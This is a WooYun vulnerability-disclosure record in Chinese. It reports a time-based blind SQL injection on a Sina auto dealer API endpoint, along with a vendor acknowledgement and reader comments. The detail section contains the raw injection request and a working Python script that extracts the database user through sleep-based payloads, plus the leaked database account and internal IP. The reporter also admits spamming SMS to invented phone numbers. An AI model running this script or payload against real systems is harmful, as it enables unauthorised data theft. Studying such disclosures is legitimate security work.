{"id": 86188, "wybug_id": "wooyun-2016-0188597", "wybug_title": "新浪某站点SQL时间盲注漏洞（附验证脚本）", "wybug_corp": "新浪", "wybug_author": "Blcat", "wybug_date": "2016-03-24 15:40", "wybug_open_date": "2016-05-09 18:25", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-09：\t细节向公众公开  简要描述： 昨天刷微博不小心挖的漏洞38万数据不给我20rank生气！！！再给我10rank我明天还挖一个你信不信 详细说明：  \nPOST /new/index.php/api/xunjia/AjaxAskPrice HTTP/1.1Host: weidealer.auto.sina.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 192info%5Bmobile%5D=13888888889&info%5Bprovince_id%5D=11&info%5Bcity_id%5D=1&info%5Bbrand_id%5D=95&info%5Bsub_brand_id%5D=1661&info%5Bcar_id%5D=18058&info%5Bxname%5D=false&info%5Bask_reffer%5D=67\n注入点car[id]时间盲注然后用自己的手机号跑啊跑啊 发现单个手机号码最多发20次短信手机号那里有个验证但是user的长度大于20，需要更换手机号，所以对不起我随便编出来的手机号的各位了附验证脚本：\n#!/usr/bin/env python# coding: UTF-8 （๑•̀ㅂ•́)و✧__author__ = 'T1m0n'import httplib, timeheaders = {    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',    'User-Agent': 'Mozilla/5.0(WindowsNT6.3;Win64;x64;rv:44.0) Gecko / 20100101Firefox / 44.0',    'Host': 'weidealer.auto.sina.com.cn',    'Content-Type': 'application/x-www-form-urlencoded',}user = ''payloads = 'abcdefghijklmnopqrstuvwxyz1234567890.@_'i = 100for x in range(1, 24):    for payload in payloads:        conn = httplib.HTTPConnection('weidealer.auto.sina.com.cn', 80)        url = '/new/index.php/api/xunjia/AjaxAskPrice'        start_time = time.time()        number = '138345%05d' % i        body = 'info[mobile]=' + number + '&info[province_id]=11&info[city_id]=1&info[brand_id]=95&info[sub_brand_id]=1661&info[car_id]=18058 AND (SELECT * FROM (SELECT'        body += '(if(ascii(substr(user(),%d,1))=%d,sleep(5),1)' % (x, ord(payload))        body += '))zkHd)-- mGEC&info[xname]=false&info[ask_reffer]=67'        conn.request('POST', url, body, headers)        res = conn.getresponse().read()        conn.close()        print '.',        i += 1        if time.time() - start_time > 5:            print payload            user += payload            breakprint user\n   漏洞证明：  \n\n跑完是这样子的\nuser:weidealer@10.73.48.34\n   修复方案：  过滤   版权声明：转载请注明来源 Blcat@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2016-03-25 18:25 厂商回复： 感谢关注新浪安全，问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-24 18:33 |    \t\thear7v \t\t\t( 普通白帽子  |\t\t\t        Rank:126 漏洞数:19        | 求组织收留啊)\t\t \n  年轻人，要超神，我的加快研发节奏了    \n     2016-03-24 22:45 |    \t\t小不点 \t\t\t( 核心白帽子 |\t\t\t        Rank:1341 漏洞数:137        | 刷起，我想换个MacBook...)\t\t \n  为什么ssrc没人审核了？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}